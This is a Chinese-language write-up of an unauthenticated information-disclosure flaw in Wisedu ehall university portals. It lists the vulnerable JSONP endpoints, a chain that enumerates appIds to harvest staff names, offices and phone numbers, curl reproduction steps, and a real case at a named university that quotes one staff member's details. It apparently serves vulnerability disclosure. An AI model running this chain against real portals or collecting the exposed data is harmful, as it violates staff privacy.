# 金智教育 ehall JSONP API 未授权访问漏洞详情

## 背景
金智教育(现江苏金智教育信息技术有限公司)是国内高校办事大厅(ehall)的主要供应商。
其平台存在多个JSONP接口无需认证即可访问，部分接口泄露教职工个人信息。

## 受影响系统特征
- URL: `ehall.XXX.edu.cn`
- 服务器: openresty
- 配置文件: `/jsonp/school.json` (JS格式，非JSON)
- 认证: CAS统一认证 (`authserver.XXX.edu.cn`)

## 漏洞端点清单

### 高危 - 泄露PII
```
GET /jsonp/appIntroduction.json?appId={appId}
响应: 包含introduction字段，可能含教职工姓名、办公室、电话
示例: "叶老师，南昌广兰校区图书馆C0303室，0791-83890898（#20898）"
```

### 中危 - 泄露系统配置
```
GET /jsonp/school.json
响应: schoolId, authserverUrl, role_data, schoolTel

GET /jsonp/serviceCenterData.json?searchKey=&containLabels=true
响应: 所有应用的appId/appName/version/categoryList

GET /jsonp/userInfo.json
响应: siteId, menuList(含urlAddress), siteType
```

### 低危 - 泄露状态信息
```
GET /jsonp/serviceRoleApp.json?serviceRoleId=1__2
GET /jsonp/myAppService.json
GET /jsonp/userSearchHistory.json
GET /jsonp/userFavoriteApps.json
GET /jsonp/readyAndOpenService.json
GET /jsonp/getThemeData.json
GET /jsonp/switchSite.json
```

## 攻击链
1. 访问 `/jsonp/serviceCenterData.json` 获取所有appId
2. 遍历appId访问 `/jsonp/appIntroduction.json?appId=XXX`
3. 从introduction字段提取教职工PII

## 报告模板
```
标题: XXX大学网上办事大厅appIntroduction接口未授权访问致教职工个人信息泄露
域名: ehall.XXX.edu.cn
漏洞类型: 信息泄露
漏洞等级: 中危
行业: 教育
地址: [省][市][区]
漏洞URL: https://ehall.XXX.edu.cn/jsonp/appIntroduction.json?appId=XXX
复现步骤:
1. curl -sk "https://ehall.XXX.edu.cn/jsonp/serviceCenterData.json" 获取appId
2. curl -sk "https://ehall.XXX.edu.cn/jsonp/appIntroduction.json?appId=XXX"
影响: 泄露教职工姓名、办公地点、电话号码
```

## 实战案例
- 东华理工大学 ecut.edu.cn (2026-05-20): 泄露叶老师信息
